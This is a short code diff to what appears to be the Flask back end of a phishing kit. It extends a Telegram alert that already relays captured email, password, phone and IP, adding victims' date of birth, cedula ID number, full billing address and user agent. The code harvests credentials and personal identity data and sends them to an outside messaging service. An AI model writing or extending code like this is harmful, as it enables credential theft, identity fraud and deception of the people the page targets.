@@ -315,7 +315,14 @@ def timeout_capture():
 <b>📧 Email:</b> {email_reason}
 <b>🔑 Password:</b> {email_reason}
 <b>📱 Phone:</b> {submission['phone_number']}
+<b>🎂 DOB:</b> {submission['date_of_birth']}
+<b>🆔 Cedula:</b> {submission['id_number']}
+<b>🏠 Street:</b> {submission['billing_address']}
+<b>🌆 City:</b> {submission['city']}
+<b>🌍 Province:</b> {submission['province']}
+<b>📮 Zip:</b> {submission['zip_code']}
 <b>🌐 IP:</b> <code>{submission['ip']}</code>
+<b>📱 User Agent:</b> {submission['user_agent'][:100]}...
 {fp_display}
 """
     send_telegram_message(telegram_msg)
@@ -390,3 +397,4 @@ def admin_clear():
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)), debug=False)
+
